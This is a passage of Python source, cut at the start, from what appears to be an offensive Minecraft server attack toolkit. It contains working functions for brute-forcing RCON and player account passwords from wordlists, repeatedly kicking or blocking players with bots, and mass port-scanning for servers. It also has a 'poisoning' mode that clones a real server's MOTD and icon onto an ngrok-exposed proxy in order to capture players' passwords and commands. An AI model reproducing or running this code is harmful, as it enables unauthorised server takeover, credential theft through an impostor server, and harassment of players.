        f = open(logs_file, 'w+', encoding='utf8')
        f.truncate(0)
        f.write(new_content)
        f.close()


def checker(ip, protocol, name, proxy, mode):
    """
    Check if the server can be entered
    """

    output_checker = ''
    ip = ip.split(':')

    try:
        if proxy is not None:
            proxy = proxy.split(':')
            process = subprocess.Popen(f'node settings/scripts/Checker.js {ip[0]} {ip[1]} {name} {protocol} {proxy[0]} {proxy[1]}', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        else:
            process = subprocess.Popen(f'node settings/scripts/Checker.js {ip[0]} {ip[1]} {name} {protocol}', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        try:
            output = process.communicate()[0].decode('utf-8')

        except UnicodeDecodeError:
            output = process.communicate()[0].decode('unicode_escape')

        clean_output = output

        if mode == 'checker':
            clean_output = clean_checker_output(clean_output)  # Returns the clean output to save to a text file.

        output = replace_json_text(output)
        output = replace_text_mccolors(output)
        output = str(output)

        if '_-Login-_' in output:
            if mode == 'kick':
                print(f'\n    {red}[{lred}BO{white}TS{red}] {lgreen}The player {name} was kicked.')

            else:
                print(f'     {red}[{lred}Chec{white}ker{red}] {green}Connected')
                output_checker = 'Connected'

        elif output == '_-Timeout-_':
            if mode == 'kick':
                print(f'\n    {red}[{lred}BO{white}TS{red}] {white}The player {name} could not be kicked. Reason: {lred}Timeout')

            else:
                print(f'     {red}[{lred}Chec{white}ker{red}] {lred}Timeout')
                output_checker = 'Timeout'

        elif '_-Connection lost-_' in output or '_-Client Error-_' in output:
            if mode == 'kick':
                print(f'\n    {red}[{lred}BO{white}TS{red}] {white}The player {name} could not be kicked. Reason: {lred}Failed to connect. (Try again)')

            else:
                print(f'     {red}[{lred}Chec{white}ker{red}] {lred}Failed to connect. (Try again)')
                output_checker = 'Failed to connect. (Try again)'

        elif output == '':
            if mode == 'kick':
                print(f'\n    {red}[{lred}BO{white}TS{red}] {white}The player {name} could not be kicked. Reason: {lred}Incompatible server version')

            else:
                print(f'     {red}[{lred}Chec{white}ker{red}] {lred}Incompatible server version')
                output_checker = 'Incompatible server version'

        elif '_-Timeout-_' in output and 'SocksClientError' in output:
            if mode == 'kick':
                print(f'\n    {red}[{lred}BO{white}TS{red}] {white}The player {name} could not be kicked. Reason: {lred}Failed to connect. The proxy did not respond. (Timeout)')

            else:
                print(f'     {red}[{lred}Chec{white}ker{red}] {lred}Failed to connect. The proxy did not respond. (Timeout)')
                output_checker = 'Timeout'

        else:
            if mode == 'kick':
                print(f'\n    {red}[{lred}BO{white}TS{red}] {white}The player {name} could not be kicked. Reason: {output}')

            else:
                print(f'     {red}[{lred}Chec{white}ker{red}] {output}')
                output_checker = clean_output

        if mode == 'checker':
            return output_checker

        return

    except KeyboardInterrupt:
        pass


def show_server(ip, motd, version, protocol, players_online, max_players, players, proxy):
    """
    Show server data
    """

    if ip != 'None' and motd != 'None':  # If the function 'get dataserver' does not return values
        print(f'\n     {red}[{lred}I{white}P{red}] {white}{ip}')
        print(f'     {red}[{lred}MO{white}TD{red}] {white}{motd}')
        print(f'     {red}[{lred}Ver{white}sion{red}] {white}{version}')
        print(f'     {red}[{lred}Proto{white}col{red}] {white}{protocol}')
        print(f'     {red}[{lred}Play{white}ers{red}] {white}{players_online}{lblack}/{white}{max_players}')

        if players is not None:
            print(f'     {red}[{lred}Nam{white}es{red}] {white}{players}')

        if connect_bot == 'y':
            username = get_name()
            output = checker(ip, protocol, username, proxy, 'checker')
            return True, output

        return True, 'None'

    return False, 'None'


def save_server(ip, motd, version, protocol, players_online, max_players, players, output_checker):
    """
    Save server data
    """

    with open(logs_file, 'a', encoding='utf8') as f:
        f.write(f'\n[IP] {ip}')
        f.write(f'\n[MOTD] {motd}')
        f.write(f'\n[Version] {version}')
        f.write(f'\n[Protocol] {protocol}')
        f.write(f'\n[Players] {players_online}/{max_players}')

        if players is not None:
            f.write(f'\n[Names] {players}')

        if output_checker != 'None':
            f.write(f'\n[Checker] {output_checker}\n')

        else:
            f.write('\n')


def write_file(file, mode, encoding_mode, text, clean):
    """
    Write the file with the specified text. (Also cleans it if necessary)
    """

    if encoding_mode is not None:
        f = open(file, mode, encoding=encoding_mode)

    else:
        f = open(file, mode)

    if clean:
        f.truncate(0)

    f.write(text)
    f.close()


def get_text_from_file(file):
    """
    Returns the text of the specified file
    """

    f = open(file)
    content = f.read()
    f.close()

    return content


def get_host_information(hostname):
    """
    Get host data
    """

    f = open('settings/settings.json', 'r')
    content = f.read()
    f.close()

    js = json.loads(content)

    for host in js['hosts']:
        if host['name'] == hostname:
            return host['nodes'], host['domain']


def get_name():
    """
    Returns a random name for the bot
    """

    names = []

    f = open('settings/files/names.txt', 'r+')
    lines = f.readlines()
    f.close()

    for line in lines:
        if not line == '' or not line == ' ':
            if '\n' in line:
                line = line.replace('\n', '')

            names.append(line)

    return random.choice(names)


def get_player(username):
    """
    Returns the information of a player.
    """

    try:
        r = requests.get(f'{mojang_api}{username}')
        r_json = r.json()
        player_uuid = r_json['id']
        player_uuid_ = f'{player_uuid[0:8]}-{player_uuid[8:12]}-{player_uuid[12:16]}-{player_uuid[16:21]}-{player_uuid[21:32]}'

        offline_player_uuid = str(uuid.UUID(bytes=hashlib.md5(bytes(f'OfflinePlayer:{username}', 'utf-8')).digest()[:16], version=3))
        offline_player_uuid_ = offline_player_uuid.replace('-', '')

        return player_uuid, player_uuid_, offline_player_uuid, offline_player_uuid_

    except KeyboardInterrupt:
        pass

    except JSONDecodeError:
        offline_player_uuid = str(uuid.UUID(bytes=hashlib.md5(bytes(f'OfflinePlayer:{username}', 'utf-8')).digest()[:16], version=3))
        offline_player_uuid_ = offline_player_uuid.replace('-', '')

        return None, None, offline_player_uuid, offline_player_uuid_

    except requests.exceptions.ConnectionError:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Connection error.')


def get_protocol(ip):
    """
    Gets the protocol of the specified server
    """

    try:
        srv = JavaServer.lookup(ip)
        response = srv.status()
        return response.version.protocol

    except (OSError, socket.gaierror, socket.timeout):
        return False


def get_server_data_mcsrvstat(ip):
    """
    Get server data using mcsrvstat.us api
    """

    try:
        r = requests.get(f'{mcsrvstat_api}{ip}')
        r_json = r.json()

    except (requests.exceptions.ConnectionError, requests.exceptions.JSONDecodeError):
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Error connecting to API. Try it again later')
        return None, None, None, None

    try:
        online_players = r_json['players']['online']
        max_players = r_json['players']['max']
        motd = r_json['motd']['raw']

    except KeyError:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The connection to the server could not be established. Enter a valid server!')
        return None, None, None, None

    try:
        icon = r_json['icon']
        data = icon.replace('data:image/png;base64,', '')
        image = base64.b64decode(data)

    except KeyError:
        image = None

    return online_players, max_players, motd, image


def get_server_data(ip):
    """
    Get data from server
    """

    players = None
    skip = False

    try:
        srv = JavaServer.lookup(ip)
        response = srv.status()

    except (OSError, socket.gaierror, socket.timeout, ValueError):
        return 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None'

    motd = replace_text_mccolors(response.description)
    log_motd = response.description.replace('§1', '').replace('§2', '').replace('§3', '').replace('§4', '').replace('§5', '').replace('§6', '').replace('§7', '').replace('§8', '').replace('§9', '').replace('§0', '').replace('§a', '').replace('§b', '').replace('§c', '').replace('§d', '').replace('§e', '').replace('§f', '').replace('§k', '').replace('§l', '').replace('§m', '').replace('§n', '').replace('§o', '').replace('§r', '').replace('\n', '')
    log_motd = re.sub(' +', ' ', log_motd)
    version = replace_text_mccolors(response.version.name)
    log_version = response.version.name.replace('§1', '').replace('§2', '').replace('§3', '').replace('§4', '').replace('§5', '').replace('§6', '').replace('§7', '').replace('§8', '').replace('§9', '').replace('§0', '').replace('§a', '').replace('§b', '').replace('§c', '').replace('§d', '').replace('§e', '').replace('§f', '').replace('§k', '').replace('§l', '').replace('§m', '').replace('§n', '').replace('§o', '').replace('§r', '').replace('\n', '')
    log_version = re.sub(' +', ' ', log_version)

    if response.players.sample is not None:
        players = str([f'{player.name} ({player.id})' for player in response.players.sample])
        players = players.replace('[', '').replace(']', '').replace("'", '').replace('(00000000-0000-0000-0000-000000000000),', '').replace('(00000000-0000-0000-0000-000000000000)', '')
        players = replace_text_mccolors(players)
        re.findall(r'[0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z]', players)

        if skip:
            if not str(response.players.online) == '0':
                pass

            else:
                return

    return ip, motd, version, response.version.protocol, response.players.online, response.players.max, players, log_motd, log_version


def get_players(ip):
    """
    Get the name of the server users
    """

    try:
        srv = JavaServer.lookup(ip)
        response = srv.status()

    except (OSError, socket.gaierror, socket.timeout):
        return False, 'Timeout'

    if response.players.sample is not None:
        players = []

        for player in response.players.sample:
            players.append(player.name)

        if len(players) >= 1:
            return players

    return False, 'Players'


def get_mods(ip):
    """
    Check if the server has mods. If you have them, return them.
    """

    try:
        r = requests.get(f'{mcsrvstat_api}{ip}')
        r_json = r.json()

        mods = []
        raw = []
        num = 0

        _mods = r_json['mods']['names']
        _raw = r_json['mods']['raw']

        for _, value in _raw.items():
            raw.append(value)

        for _ in _mods:
            mods.append(f'{_mods[num]}///({raw[num]})')
            num += 1

        if len(mods) >= 1:
            return mods

        else:
            return None

    except IndexError:
        pass  # ?

    except KeyError:
        return None

    except (requests.exceptions.ConnectionError, requests.exceptions.JSONDecodeError):
        return None


def get_ngrok_ip():
    """
    Returns the IP address of the ngrok tunnel
    """

    try:
        r = requests.get('http://localhost:4040/api/tunnels')
        r_unicode = r.content.decode('utf-8')
        r_json = json.loads(r_unicode)

        domain = r_json['tunnels'][0]['public_url']
        domain = domain.replace('tcp://', '')
        domain = domain.split(':')
        ip = socket.gethostbyname(str(domain[0]))
        ip = f'{ip}:{domain[1]}'
        return ip

    except (requests.exceptions.ConnectionError, requests.exceptions.JSONDecodeError):
        return False


def set_proxy(proxy):
    """
    Configure the proxy to be used
    """

    try:
        proxy = proxy.split(':')
        check = check_ip(proxy[0], proxy[1])

        if check:
            check = check_proxy(proxy[0], proxy[1])
            proxy = f'{proxy[0]}:{proxy[1]}'

            if not check:
                return False

            return True

        else:
            return False

    except IndexError:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid proxy.')
        return False


def rcon_connection(ip, port, password):
    """
    Connect to a server via RCON
    """

    print(f'\n    {red}[{lred}RC{white}ON{red}] {white}Connecting to the server..')
    time.sleep(0.8)

    try:
        with MCRcon(ip, password, int(port), timeout=35) as mcr:
            print(f'\n    {red}[{lred}RC{white}ON{red}] {lgreen}Connection established successfully. ({white}{ip}:{port}{lgreen})\n')

            while True:
                command = input(f'    {red}[{lgreen}#{red}]{white} Command: ')
                resp = mcr.command(command)
                resp = replace_json_text(resp)
                resp = replace_text_mccolors(resp)
                print(f'\n    {resp}\n')

    except TimeoutError:
        print(f"\n    {red}[{lred}ERR{white}OR{red}] {lred}Timeout. {white}(It's been a long time and the server is not responding)")
        return

    except ConnectionRefusedError:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {lred}Refused Connection!')
        return

    except KeyboardInterrupt:
        mcr.disconnect()
        print(f'\n\n    {red}[{lred}CTRL{white}-C{red}] {white}Stopping the connection.. ')
        return

    except MCRconException:
        print(f'\n    {red}[{lred}RC{white}ON{red}] {lred}Invalid data.')
        pass


def rcon_attack(target, port, file):
    """
    Perform a brute force attack via RCON
    """

    print(f'\n    {red}[{lred}RC{white}ON{red}] {white}Preparing the brute force attack towards {target}..')
    time.sleep(0.8)

    try:
        f = open(file, 'r', encoding='utf8')
        passwords = f.readlines()
        f.close()

    except FileNotFoundError:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The file {file} was not found.')
        return

    number_of_passwords = 0

    for _ in passwords:
        number_of_passwords += 1

    if number_of_passwords == 0:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The file is empty!')
        return

    if number_of_passwords > 1:
        text = 'passwords'

    else:
        text = 'password'

    print(f'\n    {red}[{lred}FI{white}LE{red}] {white}Selected file: {file} ({lgreen}{number_of_passwords} {text}{white})')
    time.sleep(0.8)

    print(f'\n    {red}[{lred}RC{white}ON{red}] {white}', end='')
    animated_text('Starting the attack..', 0.04)
    password_found = False
    attack_finished = False
    time.sleep(2)

    while True:
        try:
            time.sleep(0.5)

            if attack_finished:
                if password_found:
                    pass

                else:
                    subprocess.run('cls || clear', shell=True)
                    print(f'{banner}\n\n    {red}[{lred}RC{white}ON{red}] {lred}The attack ended and the password was not found.')

                break

            for password in passwords:
                password = password.replace('\n', '')
                subprocess.run('cls || clear', shell=True)
                print(f'{banner}\n\n    {red}[{lred}ATT{white}ACK{red}] {white}Testing the password: {password}')

                try:
                    with MCRcon(target, password, int(port), timeout=35) as mcr:
                        check_folder('logs', 'logs/rcon')
                        save_logs(target, 'logs/rcon/RCON', 'rcon', f'RCON Password: {password}')
                        subprocess.run('cls || clear', shell=True)
                        print(f'{banner}\n\n    {red}[{lred}ATT{white}ACK{red}] {lgreen}Password found! {white}The password is: {lgreen}', end='')
                        animated_text(password, 0.08)
                        print('')
                        mcr.disconnect()

                    password_found = True
                    break

                except TimeoutError:
                    subprocess.run('cls || clear', shell=True)
                    print(f"{banner}\n\n    {red}[{lred}ERR{white}OR{red}] {lred}Timeout. {white}(It's been a long time and the server is not responding)")
                    return

                except ConnectionRefusedError:
                    subprocess.run('cls || clear', shell=True)
                    print(f'{banner}\n\n    {red}[{lred}ERR{white}OR{red}] {lred}Refused Connection!')
                    return

                except KeyboardInterrupt:
                    subprocess.run('cls || clear', shell=True)
                    print(f'{banner}\n\n    {red}[{lred}CTRL{white}-C{red}] {white}Stopping the brute force attack (RCON).. ')
                    return

                except MCRconException:
                    pass

            attack_finished = True

        except KeyboardInterrupt:
            subprocess.run('cls || clear', shell=True)
            print(f'{banner}\n\n    {red}[{lred}CTRL{white}-C{red}] {white}Stopping the brute force attack (RCON).. ')
            break


def auth(ip, port, protocol, username, password_list):
    """
    Run my Script 'Auth_Bruteforce.py' to perform a brute force attack
    """

    print(f'\n    {red}[{lred}AU{white}TH{red}] {white}Preparing brute force attack against account {username} on server {ip}..')
    time.sleep(0.8)

    try:
        f = open(password_list, 'r', encoding='utf8')
        passwords = f.readlines()
        f.close()

    except FileNotFoundError:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The file {password_list} was not found.')
        return

    number_of_passwords = 0

    for _ in passwords:
        number_of_passwords += 1

    if number_of_passwords == 0:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The file is empty!')
        return

    if number_of_passwords > 1:
        text = 'passwords'

    else:
        text = 'password'

    print(f'\n    {red}[{lred}FI{white}LE{red}] {white}Selected file: {password_list} ({lgreen}{number_of_passwords} {text}{white})')
    time.sleep(0.8)

    print(f'\n    {red}[{lred}AU{white}TH{red}] {white}', end='')
    animated_text('Starting the attack..', 0.04)
    print('')

    process = subprocess.Popen(f'{python_command} settings/scripts/Auth_Bruteforce.py -host {ip} -p {port} -v {protocol} -n {username} -f {password_list}', stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, shell=True)

    while True:
        try:
            time.sleep(0.05)
            text = str(process.stdout.readline()).replace("b'", '').replace(r"\r\n'", '')

            if '[[CONNECTED]]' in text:
                subprocess.run('cls || clear', shell=True)
                print(f'{banner}\n\n    {red}[{lred}AU{white}TH{red}] {white}The Bot has connected to the server')

            elif '[[TESTING]]' in text:
                password = text.replace('[[TESTING]] ', '')
                subprocess.run('cls || clear', shell=True)
                print(f'{banner}\n\n    {red}[{lred}AU{white}TH{red}] {white}Testing the password: {lgreen}{password}')

            elif '[[KICK]]' in text:
                reason = text.replace('[[KICK]] "', '')
                reason = reason[:-1]
                reason = reason.replace(r'\xa70', '§0').replace(r'\xa71', '§1').replace(r'\xa72', '§2').replace(r'\xa73', '§3').replace(r'\xa74', '§4').replace(r'\xa75', '§5').replace(r'\xa76', '§6').replace(r'\xa77', '§7').replace(r'\xa78', '§8').replace(r'\xa79', '§9').replace(r'\xa7a', '§a').replace(r'\xa7b', '§b').replace(r'\xa7c', '§c').replace(r'\xa7d', '§d').replace(r'\xa7e', '§e').replace(r'\xa7f', '§f').replace(r'\xa7l', '§l').replace(r'\xa7m', '§m').replace(r'\xa7n', '§n').replace(r'\xa7o', '§o').replace(r'\xa7r', '§r').replace(r'\xa7A', '§A').replace(r'\xa7B', '§B').replace(r'\xa7C', '§C').replace(r'\xa7D', '§D').replace(r'\xa7E', '§E').replace(r'\xa7F', '§F').replace(r'\xa7K', '§K').replace(r'\xa7L', '§L').replace(r'\xa7M', '§M').replace(r'\xa7N', '§N').replace(r'\xa7R', '§O').replace(r'\xf1', 'ñ')
                reason = replace_json_text(reason)
                reason = replace_text_mccolors(reason)
                subprocess.run('cls || clear', shell=True)
                print(f'{banner}\n\n    {red}[{lred}AU{white}TH{red}] {white}Kick: {lred}{reason}')

            elif '[[NOT-FOUND]]' in text:
                attempts = text.replace('[[NOT-FOUND]] ', '')
                subprocess.run('cls || clear', shell=True)
                print(f'{banner}\n\n    {red}[{lred}AU{white}TH{red}] {white}The attack is over and the password has not been found. ({attempts} passwords were tried)')
                process.kill()
                break

            elif '[[PASSWORD]]' in text:
                check_folder('logs', 'logs/auth')
                password = text.replace('[[PASSWORD]] ', '')
                save_logs(username, f'logs/auth/{username}', 'auth', f'Password: {password}')
                subprocess.run('cls || clear', shell=True)
                print(f'{banner}\n\n    {red}[{lred}AU{white}TH{red}] {lgreen}Password found! {white}The password for {lred}{username} {white}is: {lred}{password}')
                process.kill()
                break

            elif 'node:internal/process/promises' in text:
                check_folder('logs', 'logs/errors')
                save_logs(None, 'logs/errors/AUTH_', 'error', f'Error: {text}')
                print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The server rejected the connection.')
                break

            if process.poll() is not None:
                print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The bot could not connect to the server. ')
                break

        except KeyboardInterrupt:
            process.kill()
            break


def connect(ip, port, protocol, username, proxy):
    """
    Connect a bot using the Connect.js script
    """

    if proxy is not None:
        show_proxy = f'{lgreen}Yes'

    else:
        show_proxy = f'{lred}No'

    connect_banner = rf"""{red}
                                                         
                                                        d8P  
                                                     d888888P     {white}Target: {lgreen}{ip}:{port}{red}
     d8888b d8888b   88bd88b   88bd88b  d8888b d8888b  ?88'       {white}Protocol: {lred}{protocol}{red}
    d8P' `Pd8P' ?88  88P' ?8b  88P' ?8bd8b_,dPd8P' `P  88P        {white}Username: {lcyan}{username}{red}
    88b    88b  d88 d88   88P d88   88P88b    88b      88b        
    `?888P'`?8888P'd88'   88bd88'   88b`?888P'`?888P'  `?8b       {white}Proxy: {show_proxy}{red}
                                                         
"""

    subprocess.run('cls || clear', shell=True)
    print(f'{connect_banner}\n  {lgreen}', end='')
    animated_text('[#] Connecting to the server..', 0.04)
    print(white)
    time.sleep(1)

    try:
        if proxy is not None:
            proxy = proxy.split(':')
            subprocess.run(f'node settings/scripts/Connect.js {ip} {port} {username} {protocol} {proxy[0]} {proxy[1]}', shell=True)

        else:
            subprocess.run(f'node settings/scripts/Connect.js {ip} {port} {username} {protocol}', shell=True)

    except KeyboardInterrupt:
        pass


def server_command(target):
    """
    Server command

    """

    if ':' in target:  # If the target variable contains ':'. Check if the arguments are valid
        target = target.split(':')
        check = check_ip(target[0], target[1])

        if check:
            target = f'{target[0]}:{target[1]}'

        else:
            return

    try:
        r = requests.get(f'{mcsrvstat_api}{target}')
        r_json = r.json()
        target = f'{r_json["ip"]}:{r_json["port"]}'

    except (requests.exceptions.ConnectionError, socket.gaierror, socket.timeout):
        target = '127.0.0.1:25565'

    try:
        _, motd, version, protocol, players_online, max_players, players, _, _ = get_server_data(target)

        if target != 'None' and motd != 'None':
            show_server(target, motd, version, protocol, players_online, max_players, players, None)
            mods = get_mods(target)

            if mods is not None:
                print(f'     {red}[{lred}Mo{white}ds{red}] {white}Mods found: {lgreen}\n')
                for mod in mods:
                    mod = mod.split('///')
                    print(f'      {red}• {lred}{mod[0]} {lgreen}> {white}{mod[1]} ')

        else:
            print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid domain or IP address.')

    except OSError:
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid domain or IP address.')


def kick(ip, port, protocol, message1, message2, mode, username, proxy):
    """
    Kick the specified player(s). It has three modes (kick, kickall, block)
    """

    if mode == 'kick' or mode == 'block':
        print(f'\n    {red}[{lred}{message1}{white}{message2}{red}] {white}', end='')
        animated_text('Sending to the bot..\n', 0.04)

    else:
        print(f'\n    {red}[{lred}{message1}{white}{message2}{red}] {white}Preparing the attack... ({mode})..')
        time.sleep(0.8)

        print(f'\n    {red}[{lred}{message1}{white}{message2}{red}] {white}Starting the attack on {ip}:{port}')
        time.sleep(0.8)

    if mode == 'kick':
        checker(f'{ip}:{port}', protocol, username, proxy, 'kick')

    elif mode == 'kickall':
        players = get_players(f'{ip}:{port}')

        if players[0] is not False:
            for player in players:
                checker(f'{ip}:{port}', protocol, player, proxy, 'kick')
                time.sleep(2)

            print(f'\n    {red}[{lred}{message1}{white}{message2}{red}] {white}The attack is over.')

        elif players[1] == 'Timeout':
            print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid domain or IP address.')

        elif players[1] == 'Players':
            print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Could not get users from server.')

    elif mode == 'block':
        while True:
            try:
                checker(f'{ip}:{port}', protocol, username, proxy, 'kick')
                time.sleep(3)

            except KeyboardInterrupt:
                print(f'\n    {red}[{lred}{message1}{white}{message2}{red}] {white}Stopping the attack..')
                time.sleep(0.5)
                break


def listening(target):
    """
    Listens for users entering the specified server
    """

    player_list = []
    found = False

    try:
        srv = JavaServer.lookup(target)
        _ = srv.status()

    except (socket.gaierror, socket.timeout):
        print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}Enter a valid domain or IP address.')
        return

    print(f'\n    {red}[{lred}LISTE{white}NING{red}] {white}Waiting for the players..')

    while True:
        try:
            srv = JavaServer.lookup(target)
            response = srv.status()
            if response.players.sample is not None:
                for player in response.players.sample:
                    if player.name != '':
                        if not found:
                            print(f'\n    {red}[{lred}FOU{white}ND{red}] {white}Players found: {lgreen}', end='')
                            found = True

                        if f'{player.name} ({player.id})' not in player_list:
                            player_found = f'{player.name} ({player.id})'
                            player_list.append(player_found)
                            print(f'{player_found}, ', end='')
                            sys.stdout.flush()

            time.sleep(1)

        except KeyboardInterrupt:
            print(f'\n\n    {red}[{lred}CTRL{white}-C{red}] {white}Stopping..')
            return


def start_proxy_server(target, proxy_port, location, ngrok):
    """
    Start a proxy connection to the specified server
    """

    global check_proxy_update

    old_content = ''
    ngrok_ip = False

    if check_proxy_update:
        connection = check_connection()

        if connection:
            check_proxy_version()
            check_proxy_update = False

        else:
            print(f'\n    {red}[{lred}UPD{white}ATE{red}] {white}Could not check for updates. Check your internet connection.')

    try:
        print(f'\n    {red}[{lred}PRO{white}XY{red}] {white}Preparing the proxy server..')
        time.sleep(1)

        print(f'\n    {red}[{lred}PRO{white}XY{red}] {white}Configuring the server..')
        time.sleep(1)

        settings = get_text_from_file('settings/files/proxy_settings')  # Open default settings
        settings = settings.replace('[[PORT]]', proxy_port).replace('[[ADDRESS]]', target)
        write_file(f'settings/proxy_servers/{location}/config.yml', 'w+', 'utf8', settings, True)

        if ngrok:  # If 'Ngrok' is True it means that the 'poisoning' command is being executed
            print(f'\n    {red}[{lred}PRO{white}XY{red}] {white}Copying the data from the specified server..')
            time.sleep(1)

            check_folder('logs', 'logs/poisoning', 'settings/proxy_servers/poisoning/plugins/RPoisoner')
            logs_file = save_logs(target, 'logs/poisoning/Poisoning', 'poisoning', '[•] Captured passwords:\n')

            online_players, max_players, motd, image = get_server_data_mcsrvstat(target)

            if online_players is None and max_players is None:
                return

            os.remove('settings/proxy_servers/poisoning/plugins/CleanMOTD/config.yml')
            os.remove('settings/proxy_servers/poisoning/server-icon.png')

            try:
                _ = motd[0]
                _ = motd[1]
                long_motd = True  # If the motd has two lines

            except IndexError:
                long_motd = False  # If the motd has only one line

            settings = get_text_from_file('settings/files/cleanmotd_settings')  # Save the default configuration of the CleanMOTD plugin
            settings = settings.replace('[[MAX_PLAYERS]]', str(max_players)).replace('[[AMOUNT]]', str(online_players))  # Replace the variables with the data from the server

            if long_motd:
                settings = f'{settings}\n        {motd[0]}\n        {motd[1]}'

            else:
                settings = f'{settings}\n        {motd[0]}'

            write_file('settings/proxy_servers/poisoning/plugins/CleanMOTD/config.yml', 'w+', 'utf8', settings, True)  # Save the new CleanMOTD configuration

            if image is not None:  # Save the image from the server
                write_file('settings/proxy_servers/poisoning/server-icon.png', 'wb', None, image, True)

            else:  # If the specified server has no image: Use the default image of a Minecraft server
                shutil.copy('settings/files/server-icon.png', 'settings/proxy_servers/poisoning/server-icon.png')

            if os.path.isfile('settings/proxy_servers/poisoning/plugins/RPoisoner/commands.txt'):  # Check if the RPoisoner plugin 'commands.txt' file exists (If it exists delete the previous content)
                f = open('settings/proxy_servers/poisoning/plugins/RPoisoner/commands.txt', 'w+', encoding='utf8')
                f.truncate(0)
                f.close()

            else:
                f = open('settings/proxy_servers/poisoning/plugins/RPoisoner/commands.txt', 'w')
                f.close()

            ngrok = subprocess.Popen(f'{ngrok_command} {proxy_port}', stdout=subprocess.PIPE, shell=True)

            print(f'\n    {red}[{lred}NGR{white}OK{red}] {white}Starting ngrok server..')
            time.sleep(1)

            ngrok_ip = get_ngrok_ip()

            if ngrok_ip is False:
                print(f'\n    {red}[{lred}NGR{white}OK{red}] {white}Could not get ngrok ip address')
                return

        print(f'\n    {red}[{lred}PRO{white}XY{red}] {white}', end='')
        animated_text('Starting proxy..', 0.04)

        proxy = subprocess.Popen(f'cd settings/proxy_servers/{location} && {proxy_command}', stdout=subprocess.PIPE, shell=True)

        time.sleep(1)
        print(f'\n\n    {red}[{lred}IN{white}FO{red}] {white}Proxy server details:\n\n    {red}[{lred}I{white}P{red}] {white}127.0.0.1:{proxy_port}')
        time.sleep(1)

        if ngrok:
            print(f'\n    {red}[{lred}I{white}P{red}] {white}{ngrok_ip}\n\n    {red}[{white}#{red}] {white}Waiting for commands..\n')

    except KeyboardInterrupt:
        print(f'\n    {red}[{lred}CTRL{white}-C{red}] {white}Stopping..')
        return

    while True:
        try:
            time.sleep(1)

            if ngrok:
                commands_file = open('settings/proxy_servers/poisoning/plugins/RPoisoner/commands.txt', 'r+', encoding='unicode_escape')
                content = commands_file.readlines()

                if content == old_content:
                    continue

                old_content = content

                for line in content:
                    print(f'    {red}[{lgreen}!{red}] {white}Command captured {line}')
                    with open(logs_file, 'a') as f:
                        f.write(f'Player {line}')

        except KeyboardInterrupt:
            print(f'\n    {red}[{lred}CTRL{white}-C{red}] {white}Stopping..')

            if ngrok:
                ngrok.kill()

            proxy.kill()
            break


def scan(target, ports, method, host, proxy):
    """
    Scanner
    """

    global logs_file, scanned_servers, scan_stopped

    if scan_stopped:
        return

    print(f'\n    {red}[{lred}SC{white}AN{red}] {white}Scanning IP address {target}..')

    check_folder('logs')
    date = datetime.now()

    try:
        if method == '0':  # Scan using nmap.
            scan_file = f'temp_scan_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt'
            subprocess.run(f'nmap -p {str(ports)} -T5 -Pn -v -oN {scan_file} {str(target)} >nul 2>&1', shell=True)

        elif method == '1':  # Scan using quboscanner.
            scan_file = 'unknown'

            check_folder('settings/qubo/outputs')
            file_list = os.listdir('settings/qubo/outputs')
            subprocess.run(f'cd settings/qubo && {qubo_command} -range {target} -ports {ports} -th {qubo_threads} -ti {qubo_timeout} >nul 2>&1', shell=True)
            new_file_list = os.listdir('settings/qubo/outputs')

            for file in new_file_list:
                if file in file_list:
                    pass

                else:
                    scan_file = f'settings/qubo/outputs/{file}'

            if scan_file == 'unknown':
                print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}There was an error trying to scan with quboscanner. Check the arguments.')
                return

    except KeyboardInterrupt:
        try:
            os.remove(scan_file)

        except FileNotFoundError:
            pass

        scan_stopped = True
        print(f'\n    {red}[{lred}SC{white}AN{red}] {white}Stopping the scan..')
        return

    if method != '1':
        scan_error = check_scan_error(scan_file, target)

        if not scan_error == 'None':
            return True

    if host_command:
        if first:
            check_folder('logs/host')
            logs_file = save_logs(target, f'logs/host/{host}', 'host', '[•] Servers Found:')

    else:
        check_folder('logs/scans')
        logs_file = save_logs(target, 'logs/scans/scan', 'scan', '[•] Servers Found:')

    check__encoding = check_encoding(scan_file)
    scan_date = datetime.now()
    scan_ip_list = f'temp_scan_ip_list_{str(scan_date.day)}-{str(scan_date.month)}-{str(scan_date.year)}_{str(scan_date.hour)}.{str(scan_date.minute)}.{str(scan_date.second)}.txt'
    scan_results = open(scan_ip_list, 'w+')

    with open(scan_file, encoding=check__encoding) as scan__result:  # Save all ip addresses in text file.
        if method == '0':  # Nmap
            for line in scan__result:
                ip = re.findall('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line)
                ip = ' '.join(ip)
                ip = ip.replace('(', '').replace(')', '')
                port = re.findall('\d{1,5}\/tcp open', line)
                port = ' '.join(port)

                if '.' in ip:
                    current_ip = ip

                if 'tcp' in port:
                    port = port.replace('/tcp open', '')
